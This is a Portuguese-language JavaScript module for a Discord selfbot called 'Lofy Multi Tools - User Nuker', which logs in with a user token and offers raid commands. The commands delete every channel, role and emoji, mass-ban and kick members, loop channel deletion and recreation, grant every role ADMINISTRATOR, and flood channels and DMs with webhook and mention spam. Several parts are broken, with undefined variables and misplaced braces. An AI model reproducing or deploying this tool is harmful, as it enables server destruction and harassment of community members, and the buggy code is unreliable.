module.exports.self = function () {
process.title = "Lofy Multi Tools - User Nuker"
console.clear();


const {Client} = require("discord.js-selfbot-v11"),
client = new Client(),
colors = require("colors"),
snekfetch = require("snekfetch"),
json = require("../Arquivos Config/config.json"),
readline = require("readline").createInterface({
	input: process.stdin,
	output: process.stdout
})

process.on("unhandledRejection", e => {})
process.on("uncaughtException", e => {})
process.on("uncaughtRejection", e => {})
process.warn = () => {}


client.on('ready', () => {
	
});

client.on("error", () => {})
client.on("warn", () => {})

console.log(`\n\n
     ██╗      ██████╗ ███████╗██╗   ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
     ██║     ██╔═══██╗██╔════╝╚██╗ ██╔╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
     ██║     ██║   ██║█████╗   ╚████╔╝     ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
     ██║     ██║   ██║██╔══╝    ╚██╔╝      ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
     ███████╗╚██████╔╝██║        ██║       ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
     ╚══════╝ ╚═════╝ ╚═╝        ╚═╝       ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 \n\n
`.magenta)


client.on('message', async (message) => {


if (message.author.id !== client.user.id) return;
if (!message.content.startsWith(json.prefixo)) return;

const timer = message.content.slice(json.prefixo.length)
const timer_1 = timer.split(' ')
const comando = timer_1.shift().toLowerCase()


if (comando === 'spam') {

	let fuck = timer_1.join(' ')
	message.delete()
	for (pas = 0; pas < 999; pas++) {
		message.channel.send(fuck)
		}
	console.log('     [+] Spam enviado com a mensagem: '.red, fuck)
}


if (comando === 'svfoto') {

	message.delete()
	const berg34 = timer_1.join(' ');
	message.guild.setIcon(berg34);
	console.log('     [+] Foto do servidor alterada'.yellow)

}


if (comando === 'mudarn') {

	message.delete();
	let mente = timer_1.join(' ');
	message.guild.members.cache.forEach((pente) => {
		pente.setNickname(mente)
	})
	console.log('     [+] Nome de todos os membros alterado'.yellow)

}


if (comando === 'jogo') {

	message.delete()
	let fuck = timer_1.join(' ');
	client.user.setActivity(fuck, {
		type: 'PLAYING'
	});
	console.log('     [+] Nova atividade de jogo'.yellow)

}



if (comando === 'emoji') {

	message.guild.emojis.cache.forEach((deob) => {
		return deob.delete({
			reason: 'lofy'
		}).then(console.log(`${'     [✓]: '}${deob.name }${' foi apagado'}`))
	})
	message.delete()
	console.log('     [+] Emojis apagados'.yellow)

}


if (comando === 'live') {

	message.delete();
	let fuck = timer_1.join(' ');
	client.user.setActivity(fuck, {
		type: 'STREAMING',
		url: 'https://timer.com/c/polarlofy'
	})
	console.log('     [+] Nova live adicionada'.yellow)
}


if (comando === 'help') {

	message.delete()
	message.channel.send("**Lista de Comandos**\n\n> *@spam -> `Spam kk`\n> *@emoji -> `Apaga todos os emojis`\n> *@jogo -> `Coloca uma nova atividade de jogo`\n> *@live -> `Perfil roxo`\n> *@mudarn -> `Muda o nome de geral`\n> *@canais -> `Muda o nome de todos os canais`\n> *@cargos -> `Muda o nome de todos os cargos`\n> *@ban -> `Ban na maioria dos membros`\n> *@webhook -> `Faz spam com uma webhook`\n> *@clear -> `Limpa todas as suas mensagens`\n> *@bug -> `Loop infinito de apagar e criar canais, ninguém escreve hoje xD`\n> *@dr -> `Deleta todos os cargos`\n> *@dc -> `Deleta todos os canais`\n> *@cw -> `Cria um canal e faz spam usando uma webhook`\n> *@perms -> `Loop infinito removendo e adicionando permissões do everyone`\n> *@random -> `Faz spam por menção em um membro (pv/server)`".replaceAll("*@",json.prefixo))

}

if (comando === 'canais') {
	
	message.delete()
	let fuck = timer_1.join(' ');
	let limitado = message.guild.channels.cache.forEach((limitado) => {
		return limitado.setName(fuck)
})
console.log('     [+] Nome de todos os canais alterados'.yellow)

}

if (comando === 'cargos') {
	
	message.delete()
	let fuck = timer_1.join(' ')
	const fofoca = message.guild.roles.cache.forEach((fofoca) => {
		return fofoca.setName(fuck)
	})
	console.log('     [+] Nome de todos os cargos alterados'.yellow)

}


if (comando === 'ban') {

	message.delete()
	message.guild.members.cache.filter((lol) => {
		return !lol.bannable < !message.guild.owner < message.guild.me.roles.highest.position
	}).forEach((lol) => {
		lol.ban().then((lol) => {
			console.log(`${'     [ + ]: Membro: '}${lol .user  .tag }${' foi banido'}`.yellow)
		})
})

}


if (comando === 'webhook') {

	let fuck = timer_1.join(' ');
	message.delete()
	const baye_webhook = message.channel.createWebhook('Lofy', {
		avatar: 'https://cdn.discordapp.com/attachments/608711485849337856/916770334965915678/CheerfulAlarmedBlacklab-max-1mb.gif'
	}).then((baye_webhook) => {
		for (pas = 0; pas < 950; pas++) {
			baye_webhook.send(fuck)
		}
})

}


if (comando === 'clear') {

	let vermes = parseInt(timer_1[0]) || 1;
	message.delete()
	message.channel.messages.fetch({limit: Math.min(vermes, 100),before: message.id}).then((atencion) => {
		Promise.all(atencion.filter((lol) => {
			return lol.author.id === client.user.id
		}).map((lol) => {
			return lol.delete()
		})).then(() => {
			console.log(`${'     [+] Apagadas: \\`'}${count}${'\\` mensagens.'}`.yellow)
		})
})

}


if (comando === 'bug') {
	
	message .delete ()
	let gloria_a_deus = 0;
	setInterval(function() {
		if (gloria_a_deus === 0) {
			message.guild.channels.cache.forEach((limitado) => {
				return limitado.delete ()
			})
			gloria_a_deus = 1
		} else {
			if (gloria_a_deus === 1) {
				for (pas = 0; pas < 10; pas++) {
					message.guild.channels.create('Lofy está ta presente', {
						type: 'text'
					})
				}
				gloria_a_deus = 2
			} else {
				if (gloria_a_deus === 2) {
					random = Math .floor (Math .random () * 7) + 1;
					message.guild.channels.cache.forEach ((limitado) => {
						return limitado .delete ()
					})
					gloria_a_deus = 0
				}
			}

		}}, 1000)

}


if (comando === 'dr') {

	message.delete ()
	message.guild.roles.cache.filter((meianoite) => {
		return !meianoite.managed  && meianoite.position  < message.guild.me.roles.highest.position  && meianoite.id  !== message.guild.id 
	}) .forEach ((fofoca) => {
		fofoca .delete () .then ((lol) => {
			console .log (chalk .green (`${'     [ + ] Cargo deletado: '}${lol .name }${' ('}${lol.toString()}${')'}`))
		})

})

}


if (comando === 'dc') {

	message.delete()
	message.guild.channels.cache.filter((limitado) => {
		return limitado.delete()
	}).then(console.log('tesre'))

}


if (comando === 'cw') {
	
	let fuck = timer_1.join(' ');
	message.delete()
	message.guild.channels.cache.forEach((limitado) => {
		return limitado.delete()
	});
	for (pas = 0; pas < 950; pas++) {
		message.guild.channels.create('caiu bro :)', {
			type: 'text'
		}).then((limitado) => {
			limitado.createWebhook('caiu ae?', {
				avatar: 'https://images-ext-1.discordapp.net/external/ioLDZ2VPJxnChV4FlYnCndokBrbx79atVcR3LewGaro/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/569521146605600778/398bb14797cbbf06f592ad9745a480fd.png'
			}).then((baye_webhook) => {
				for (pas = 0; pas < 950; pas++) {
					baye_webhook.send(fuck)
				}
			})
		})
	}


if (comando === 'perms') {
	
	message.delete()
	let baye_role = 0;
	setInterval(function() {
		if (baye_role === 0) {
			message.guild.roles.cache.forEach((fofoca) => {
				return fofoca.setPermissions(['ADMINISTRATOR'])
			});
			baye_role = 1
		} else {
			if (baye_role === 1) {
				message.guild.roles.cache.forEach((fofoca) => {
					return fofoca.setPermissions(['VIEW_CHANNEL'])
				})
				baye_role = 2
			} else {
				if (baye_role === 2) {
					random = Math.floor(Math.random() * 7) + 1;
					message.guild.roles.cache.forEach((fofoca) => {
						return fofoca.setPermissions(['VIEW_CHANNEL'])
					});
					baye_role = 0
				}
			}
		}}, 1000)
}


if (comando === 'kickCargos') {
	
	let bundaveira = (message.guild.roles.cache.get('884654115303608331').members);
	bundaveira.forEach((lol) => {
		setInterval(function() {
			lol.kick();
			console.log(`${'     [ + ] O membro '}${pente}${' foi kickado/banido'}`.yellow)
		}, 1000)
	})

}


if (comando === 'random') {
	message.delete()
	var pente = message.guild.members.cache.random();
	for (pas = 0; pas < 150; pas++) {
		message.channel.send(`${pente}`);
		pente.send(`${pente}${' tu foi escolhido kkkj'}`).catch((yobro) => {
			console.log(chalk.red('Ocorreu um erro: ' + yobro))
		})
	}
	
console.log(`${'     [+] O membro sortudo foi... '}${pente}`.yellow)
}

}});


client.login(json.token_conta).catch((err) => {
	require('./Fim/index').acabou(2, "\n   [!] Token Invalido!\n   "+err+"\n   [1] Tentar Novamente\n   [2] Sair".red, "", readline, "", "", "user-nuker", "")
})

}
